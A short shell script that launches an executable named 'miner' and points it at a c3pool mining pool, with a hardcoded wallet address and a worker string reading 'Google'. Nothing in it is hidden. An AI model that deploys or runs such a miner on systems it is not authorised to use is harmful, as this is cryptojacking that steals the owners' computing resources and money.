#!/bin/sh
cd "$(dirname "$0")"
chmod +x ./miner && ./miner  --algo ethash --server eth.c3pool.com:43333 --user 86zgyvSviNQR1mDNRaZgWb16WffcqHKWnUJGBvJgqqMZKLYpsxZP2HsPmY2QPdNYtU1yL6xFUXtoP1tCjbud8eGmVjkK6Ly --pass "Google~ethash" --proto stratum
